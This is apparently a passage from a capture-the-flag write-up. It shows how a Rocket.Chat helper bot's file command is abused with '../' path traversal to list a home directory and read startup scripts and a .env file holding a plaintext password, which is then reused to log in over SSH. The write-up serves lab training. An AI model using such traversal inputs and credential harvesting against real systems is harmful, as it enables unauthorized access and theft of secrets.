###  recyclops

Upon visiting  the registration link in the previous section and creating account, we see there is a  recyclops bot we can interact with 


These are the commands we can use with recyclops bot:

```
-   <=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
    

-   For security reasons, the access is limited to the Sales folder.
    

-   3. Files:
    
-   eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'
    

-   4. List:
    
-   You can ask me to list the files
    
-   eg: 'recyclops i need directory list sale' or just 'recyclops list sale'
    

-   5. Time:
    
-   You can ask me what the time is
    
-   eg: 'recyclops what time is it?' or just 'recyclops time'
```

We can only look at `/sale` it seems, but this is escapable using `../../`

We use `recyclops list ../`

```
total 32  
drwx------ 11 dwight dwight 281 Feb 6 16:03 .  
drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..  
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null  
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout  
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile  
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc  
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config  
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth  
drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg  
drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot  
-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history  
drwx------ 3 dwight dwight 19 Jul 3 2021 .local  
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla  
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm  
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales  
drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh  
-r-------- 1 dwight dwight 33 Feb 6 16:03 user.txt  
drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim
```

We can't grab the user flag, but we can look at `bot_restart.sh`
This script tells us there is a `/home/dwight/hubot/` directory

We explore this directory and find `start_bot.sh`

```
-   <!=====Contents of file ../hubot/start_bot.sh=====>
    
-   #!/bin/bash  
    cd /home/dwight/hubot  
    source /home/dwight/hubot/.env  
    /home/dwight/hubot/bin/hubot  
    #cd -
    
-   #!/bin/bash  
    cd /home/dwight/hubot  
    source /home/dwight/hubot/.env  
    /home/dwight/hubot/bin/hubot  
    #cd -
    
-   <!=====End of file ../hubot/start_bot.sh=====>
```

This prompts me to take a look at `../hubot/.env`

```
-   <!=====Contents of file ../hubot/.env=====>
    
-   export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320)'  
    export ROCKETCHAT_USER=recyclops  
    export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
    export ROCKETCHAT_USESSL=false  
    export RESPOND_TO_DM=true  
    export RESPOND_TO_EDITED=true  
    export PORT=8000  
    export BIND_ADDRESS=127.0.0.1
    
-   export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320)'  
    export ROCKETCHAT_USER=recyclops  
    export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
    export ROCKETCHAT_USESSL=false  
    export RESPOND_TO_DM=true  
    export RESPOND_TO_EDITED=true  
    export PORT=8000  
    export BIND_ADDRESS=127.0.0.1
    
-   <!=====End of file ../hubot/.env=====>
```

Looks like we have the rocketchat pw for recyclops

It won't let me log into rocketchat with this password, but perhaps Dwight reused this password for ssh.

He did. We have ssh access with dwight now

`dwight:Queenofblad3s!23`